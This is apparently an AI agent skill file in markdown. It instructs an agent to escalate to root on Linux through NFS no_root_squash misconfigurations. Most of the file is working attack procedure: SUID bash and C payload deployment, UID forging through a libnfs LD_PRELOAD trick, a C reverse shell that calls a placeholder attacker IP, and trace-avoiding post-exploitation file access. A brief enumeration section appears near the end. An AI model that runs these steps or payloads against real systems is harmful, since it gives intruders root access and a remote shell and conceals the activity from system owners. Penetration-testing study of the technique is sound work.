---
name: nfs-privilege-escalation
description: Privilege escalation via NFS no_root_squash misconfiguration. Use this skill whenever you need to escalate privileges on a Linux system with NFS shares, when you find /etc/exports with no_root_squash, when you have access to an NFS share and want to gain root, or when you're doing Linux privilege escalation and NFS is available. This includes both remote exploits (mounting from attacker machine) and local exploits (using libnfs to forge RPC calls).
---

# NFS Privilege Escalation via no_root_squash

This skill helps you escalate privileges on Linux systems with misconfigured NFS shares using the `no_root_squash` vulnerability.

## When to Use This Skill

Use this skill when:
- You find `/etc/exports` with `no_root_squash` configuration
- You have access to an NFS share and want to gain root privileges
- You're performing Linux privilege escalation and NFS is available
- You need to understand NFS squashing behavior (`all_squash`, `root_squash`, `no_root_squash`)

## Understanding NFS Squashing

NFS trusts the `uid` and `gid` indicated by the client (unless Kerberos is used). Server configurations can change this:

| Configuration | Behavior |
|--------------|----------|
| `all_squash` | Maps all users to `nobody` (UID 65534) |
| `root_squash` | Default on Linux - only squashes UID 0 (root) to `nobody` |
| `no_root_squash` | **Does NOT squash root** - allows root access via NFS |

If a directory is configured with `no_root_squash`, you can write to it as root from a client machine.

## Remote Exploitation (Attacker Has NFS Access)

### Method 1: Bash Binary with SUID

```bash
# On attacker machine (as root)
mkdir /tmp/pe
mount -t nfs <TARGET_IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

# On victim machine
cd <SHARED_FOLDER>
./bash -p  # Root shell
```

### Method 2: Custom C Payload

```bash
# On attacker machine
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <TARGET_IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp payload .
chmod +s payload

# On victim machine
cd <SHARED_FOLDER>
./payload  # Root shell
```

**Note:** If `no_root_squash` is NOT enabled, you can still escalate to other users by setting SUID with their UID.

## Local Exploitation (Using libnfs)

Use this when:
- `/etc/exports` restricts access to specific IPs
- You cannot mount remotely
- The export uses the `insecure` flag

### Step 1: Compile libnfs

```bash
git clone https://github.com/sahlberg/libnfs
cd libnfs
./bootstrap
./configure
make

# Compile the LD preloader
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```

**Note:** You may need to comment out `fallocate` syscalls depending on kernel version.

### Step 2: Create and Deploy Exploit

```bash
# Create simple root shell payload
cat > pwn.c << 'EOF'
#include <unistd.h>
#include <stdlib.h>

int main(void){
    setreuid(0,0);
    system("/bin/bash");
    return 0;
}
EOF

gcc pwn.c -o a.out

# Deploy to NFS share with forged UID
export LD_NFS_UID=0
export LD_LIBRARY_PATH=./lib/.libs/
export LD_PRELOAD=./ld_nfs.so

cp a.out nfs://<NFS_SERVER>/<SHARE_PATH>/
chown root: nfs://<NFS_SERVER>/<SHARE_PATH>/a.out
chmod o+rx nfs://<NFS_SERVER>/<SHARE_PATH>/a.out
chmod u+s nfs://<NFS_SERVER>/<SHARE_PATH>/a.out

# Execute on victim
/<MOUNT_POINT>/a.out
# root
```

## Post-Exploitation: Stealthy File Access

After gaining root, use the `nfshell` script to interact with the NFS share without changing file ownership (avoiding traces):

```bash
# Run: nfshell <command> <path>
./nfshell ls -la ./mount/
./nfshell cat ./mount/sensitive_file.txt
```

See `scripts/nfshell.py` for the implementation.

## Detection and Enumeration

### Check for Vulnerable NFS Exports

```bash
# On victim machine
cat /etc/exports
grep -E "no_root_squash|insecure" /etc/exports

# Check mounted NFS shares
mount | grep nfs
showmount -e <NFS_SERVER_IP>
```

### Identify NFS Share Permissions

```bash
# Check file ownership on NFS share
ls -la /mnt/nfs_share/
stat /mnt/nfs_share/<file>
```

## Common Payloads

### Simple Root Shell (C)

```c
#include <unistd.h>
#include <stdlib.h>

int main(void){
    setreuid(0,0);
    system("/bin/bash");
    return 0;
}
```

### Reverse Shell (C)

```c
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    setreuid(0,0);
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, "<ATTACKER_IP>", &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    system("/bin/bash");
    return 0;
}
```

## Important Notes

1. **`no_root_squash` is required** for remote root exploitation
2. **`insecure` flag** is required for local libnfs exploitation
3. **Kernel compatibility** - libnfs may need modifications for different kernel versions
4. **Stealth** - Use `nfshell` to avoid leaving traces after exploitation
5. **Tunneling** - If you can create a tunnel to the victim, you can use remote exploitation methods

## References

- [NFS Service Pentesting](../../network-services-pentesting/nfs-service-pentesting.md)
- [libnfs GitHub](https://github.com/sahlberg/libnfs)
- [NFS Privilege Escalation Tutorial](https://www.errno.fr/nfs_privesc.html)
